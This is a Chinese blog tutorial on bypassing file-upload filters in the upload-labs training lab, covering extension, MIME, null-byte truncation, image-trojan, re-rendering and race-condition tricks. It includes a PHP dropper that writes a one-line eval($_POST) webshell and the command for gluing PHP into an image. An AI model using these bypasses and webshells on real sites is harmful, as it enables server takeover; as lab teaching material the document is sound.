---
layout: post
title: "webshell一些上传心得"
date: 2025-03-09 09:47:28 +0800
description: "webshell的一些防御绕过方式"
keywords: "webshell一些上传心得"
categories: ['Penetration']
tags: ['安全']
artid: "146127807"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146127807
    alt: "webshell一些上传心得"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146127807
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146127807
cover: https://bing.ee123.net/img/rand?artid=146127807
image: https://bing.ee123.net/img/rand?artid=146127807
img: https://bing.ee123.net/img/rand?artid=146127807
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     webshell一些上传心得
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
     我们以upload-labs为基础
    </p>
    <h2>
     <a id="_2">
     </a>
     一、前端拦截：
    </h2>
    <blockquote>
     <p>
      如第一关
     </p>
    </blockquote>
    <h3>
     <a id="_6">
     </a>
     工作方式：
    </h3>
    <p>
     直接在前端拦截
    </p>
    <h3>
     <a id="_10">
     </a>
     绕过方式：
    </h3>
    <p>
     因为没有限制后端，所有可以用bs 绕过前端修改格式即可
    </p>
    <ul>
     <li>
      <p>
       将需要上传的php文件改成jpg格式
      </p>
     </li>
     <li>
      <p>
       使用burp suite 拦截上传后，使用repeater模块将jpg改回php发送即可
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/f045b76195ae4798b3da2e08639aa2ff.png"/>
      </p>
     </li>
     <li>
      <p>
       可以看到成功上传
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/6ccbf262f76648d79b8e4b760d1e32b3.png"/>
      </p>
     </li>
    </ul>
    <h2>
     <a id="_19">
     </a>
     二、只判断文件类型：
    </h2>
    <blockquote>
     <p>
      如第二关
     </p>
    </blockquote>
    <h3>
     <a id="_23">
     </a>
     工作方式：
    </h3>
    <p>
     只判断了文件的类型，而没有进行其他的检查方式
    </p>
    <h3>
     <a id="_27">
     </a>
     绕过方式：
    </h3>
    <p>
     使用bs将返回的数据包中文件格式直接改成允许的文件格式即可绕过
    </p>
    <ul>
     <li>
      <p>
       将php文件上传的同时使用bs抓包
      </p>
     </li>
     <li>
      <p>
       使用repeater模块，将content-type中数据改为
       <code>
        image/png
       </code>
       即可
       <br/>
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/f29274f30b6c44368deed94961e03b6c.png"/>
      </p>
     </li>
     <li>
      <p>
       可以看到已成功上传
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/697f77483ecf4a82957a56332d52bc80.png"/>
      </p>
     </li>
    </ul>
    <h2>
     <a id="_37">
     </a>
     三、黑名单限制
    </h2>
    <blockquote>
     <p>
      如第5、6、7、8、9关（因为是windows的特性，所以只能在windows中使用）
     </p>
    </blockquote>
    <h3>
     <a id="_41">
     </a>
     工作方式：
    </h3>
    <p>
     匹配到代码带有的黑名单后会直接拦截
    </p>
    <h3>
     <a id="_45">
     </a>
     绕过方式：
    </h3>
    <p>
     将后缀改为一些没有被拦截到的方式进行绕过
    </p>
    <table>
     <thead>
      <tr>
       <th>
        绕过方式
       </th>
       <th>
        示例
       </th>
       <th align="left">
        绕过原因
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        修改大小写绕过
       </td>
       <td>
        <code>
         1.Php
        </code>
       </td>
       <td align="left">
        windows不区分大小写
       </td>
      </tr>
      <tr>
       <td>
        添加末尾空格绕过
       </td>
       <td>
        <code>
         1.php
        </code>
       </td>
       <td align="left">
        Windows会自动删除首尾空格
       </td>
      </tr>
      <tr>
       <td>
        在末尾添加 . 绕过
       </td>
       <td>
        1.php.
       </td>
       <td align="left">
        windows会删除末尾的点
       </td>
      </tr>
      <tr>
       <td>
        在末尾添加
        <code>
         ::$DATA
        </code>
        绕过
       </td>
       <td>
        <code>
         1.php:$DATA
        </code>
       </td>
       <td align="left">
        Windows会将以
        <code>
         ::$DATA
        </code>
        结尾的文件以数据流的方式处理
       </td>
      </tr>
     </tbody>
    </table>
    <h2>
     <a id="_56">
     </a>
     四、删除黑名单内容
    </h2>
    <blockquote>
     <p>
      如第十关
     </p>
    </blockquote>
    <h3>
     <a id="_60">
     </a>
     工作方式：
    </h3>
    <p>
     将匹配到的黑名单的信息删掉
    </p>
    <h3>
     <a id="_64">
     </a>
     绕过方式：
    </h3>
    <p>
     双写代码实现绕过如
     <code>
      1.pphphp
     </code>
    </p>
    <h2>
     <a id="_68">
     </a>
     五、修改文件上传位置：
    </h2>
    <blockquote>
     <p>
      如第十一、十二关
     </p>
    </blockquote>
    <h3>
     <a id="_72">
     </a>
     工作方式：
    </h3>
    <p>
     用户在上传文件后，程序将在temp目录下生成一个临时文件，再将该文件转到程序指定的目录下
    </p>
    <h3>
     <a id="_76">
     </a>
     绕过方式：
    </h3>
    <p>
     在第十一关：文件保存路径是由第9行代码决定
    </p>
    <pre><code class="prism language-php"><span class="token comment"># 第十一关的部分代码如下</span>
<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>  <span class="token comment"># 看这行代码</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
    <p>
     我们随意上传一个文件：可以看出用户可以修改save_path函数的内容，那我们将内容改为
     <code>
      ../uploads/1.php%00
     </code>
     然后上传文件后缀为
     <code>
      .jpg
     </code>
     的
     <code>
      php
     </code>
     文件，代码处得到的后缀为jpg，能够通过对文件后缀的检测，但在
     <code>
      $img_path
     </code>
     变量处就会出现其值为
     <code>
      ../uploads/1.php%00+随机日期.jpg
     </code>
     ，当执行
     <code>
      move_uploaded_file
     </code>
     函数时，服务器会对路径中%00后的内容不做解析，默认迁移文件为
     <code>
      ../uploads/1.php
     </code>
     。
    </p>
    <blockquote>
     <h5>
      <a id="00_103">
      </a>
      %00截断原理：
     </h5>
     <p>
      这是字符串的结束标识符（不再对后文的信息进行处理），攻击者可以利用手动添加字符串标识符的方式将后面的内容忽略，而后面的内容又可以帮助我们绕过检测。
     </p>
    </blockquote>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/7ac16c2255ca46c2b16ccd757fcf1a64.png"/>
    </p>
    <ul>
     <li>
      <p>
       将jpg格式的php文件上传的同时使用bs抓包
      </p>
     </li>
     <li>
      <p>
       将抓到的数据包转到repeater模块同时修改
       <code>
        save_path
       </code>
       并发送
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/758a4ca690384eb586048f68c557460a.png"/>
      </p>
     </li>
     <li>
      <p>
       可以看出php文件以及上传为1.php。同时，因为1.php后面的\0将后面的jpg忽略了
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/b5f936e3f6f84f2d952697d0f088e083.png"/>
      </p>
     </li>
    </ul>
    <p>
     注意在第十二关中使用的是post方法，需要对%00解码：
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/76b2d62f3b164e569ca331b5771e2d3d.png"/>
    </p>
    <h2>
     <a id="_118">
     </a>
     六、文件头检查（文件包含）：
    </h2>
    <blockquote>
     <p>
      如第14、15、16关
     </p>
    </blockquote>
    <h3>
     <a id="_122">
     </a>
     工作方式：
    </h3>
    <pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function-definition function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只读2字节</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$strInfo</span> <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    
    <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$typeCode</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>      
        <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>        
        <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'unknown'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>    
        <span class="token keyword">return</span> <span class="token variable">$fileType</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
    <p>
     如这个函数片段，该检查方式是查看文件头部的两个字节的信息（前几个字节是格式信息）。如图：
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/a306ac6c17d34c83ad10b07f68467ab8.png"/>
    </p>
    <h3>
     <a id="_153">
     </a>
     绕过方式：
    </h3>
    <p>
     <mark>
      前提：需要有文件包含漏洞才可实现，因为使用图片马会导致拼接的php代码无法解析
     </mark>
    </p>
    <p>
     因为检查的文件头部信息，上述的如改文件格式等方式肯定是不行了，就需要使用
     <strong>
      图片马
     </strong>
     了
    </p>
    <blockquote>
     <h5>
      <a id="_159">
      </a>
      图片马：
     </h5>
     <p>
      在图片信息的后面拼接木马信息，使得在检查时，前几个字节仍然是正常的图片信息，但后面的php不会被检查，从而绕过检测上传
     </p>
    </blockquote>
    <ul>
     <li>
      制作图片马：
     </li>
    </ul>
    <p>
     打开cmd窗口（注意工作目录）、
     <code>
      copy 1.png/b + 1.php /a 1.png
     </code>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/36e58b4429bb46fe9f18e590b54cb00f.png"/>
     <br/>
     拼接之后的数据：
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/469aee5fb0e3466e94677f52bcfd1d42.png"/>
    </p>
    <ul>
     <li>
      <p>
       将制作好的图片马直接上传
      </p>
     </li>
     <li>
      <p>
       再利用文件包含漏洞即可成功
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/72285579a91042a89949873e79a8dd9a.png"/>
      </p>
     </li>
    </ul>
    <h2>
     <a id="_173">
     </a>
     七、二次渲染：
    </h2>
    <blockquote>
     <p>
      第16关
     </p>
    </blockquote>
    <h3>
     <a id="_177">
     </a>
     工作方式：
    </h3>
    <p>
     用户上传图片后，程序并没有直接将该图片使用，而是用该图片生成一个新的图片，将新的图片用于内部使用
    </p>
    <pre><code class="prism language-php">     <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 用$target_path的图片生成一个新的图片赋值给$im</span>
</code></pre>
    <h3>
     <a id="_188">
     </a>
     绕过方式：
    </h3>
    <p>
     <mark>
      图片会进行二次渲染从而使图片马不能正常使用，需要寻找没有被修改且不会影响图片格式的部分插入一句话木马
     </mark>
    </p>
    <table>
     <thead>
      <tr>
       <th>
        格式
       </th>
       <th>
        webshell插入位置
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        GIF：
       </td>
       <td>
        可以直接在渲染前后没变化的数据块插入木马即可
       </td>
      </tr>
      <tr>
       <td>
        PNG：
       </td>
       <td>
        需要将数据写入PLTE或IDAT模块
       </td>
      </tr>
      <tr>
       <td>
        JPG：
       </td>
       <td>
        需要插入到指定的数据块，而且可能不成功，所以需要多次尝试
       </td>
      </tr>
     </tbody>
    </table>
    <p>
     GIF绕过：
    </p>
    <ul>
     <li>
      上传一个普通的GIF图片；将渲染后的图片下载后进行比较
     </li>
     <li>
      使用010editer等工具进行比较
     </li>
     <li>
      最好选择相同且为全0的填充字段，如果没有，在偏后的部分找相同字段修改也可以的
     </li>
    </ul>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/5add9624167d48598d6c9c8e29f59b31.png"/>
    </p>
    <ul>
     <li>
      利用文件包含漏洞访问
      <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/d0e8d9e976b0406396111874bc4ae70c.png"/>
     </li>
    </ul>
    <h2>
     <a id="_209">
     </a>
     八、条件竞争
    </h2>
    <blockquote>
     <p>
      第十七关
     </p>
    </blockquote>
    <h3>
     <a id="_213">
     </a>
     工作方式
    </h3>
    <pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  				 <span class="token comment">#移动文件</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span> 							<span class="token comment"># 判断文件后缀</span>
             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           						 <span class="token comment"># 删除文件</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
    <p>
     代码的处理流程
    </p>
    <ul>
     <li>
      移动文件到指定路径
     </li>
     <li>
      判断文件后缀是否符合
     </li>
     <li>
      符合则重命名；不符合则删除文件
     </li>
    </ul>
    <h3>
     <a id="_248">
     </a>
     绕过方式
    </h3>
    <p>
     像这种存在代码逻辑问题（先移动再删除），服务器处理过程中，总是有时间差，而我们上传图片后在文件还没被删除时就快速访问目标文件（上传的文件是在上级目录再创建一个木马文件），就能够在删除前就创建新的木马文件，源文件删除后，新木马文件并不会删除
    </p>
    <ul>
     <li>
      创建木马文件
      <code>
       q.php
      </code>
      ：在执行时会在上级目录生成一个1.php的木马文件
     </li>
    </ul>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../1.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["111"])?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <ul>
     <li>
      <p>
       将
       <code>
        q.php
       </code>
       上传并用bs抓包
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/a2f8a6de7cc74f5da69cd47362873a3a.png"/>
      </p>
      <p>
       转入intruder模块，随便设置一下
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/b50d20771fe54bc6b26a505064d65e3e.png"/>
      </p>
     </li>
     <li>
      <p>
       再抓一个访问q.php的数据包
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/6bb83e4f7bfc490b8675860ad1c56fb4.png"/>
      </p>
     </li>
     <li>
      <p>
       也转入intruder模块
      </p>
     </li>
     <li>
      <p>
       准备工作做好后，开始攻击
      </p>
      <p>
       可以看到有一个成功，再打开vscode
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/12d1d9aee95546789d73582ad2895eb7.png"/>
       <br/>
       1.php已经生成
       <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/dfe506436df04794810117525ca5f6f5.png"/>
      </p>
     </li>
    </ul>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f6d305f37343631383337302f:61727469636c652f64657461696c732f313436313237383037" class_="artid" style="display:none">
 </p>
</div>


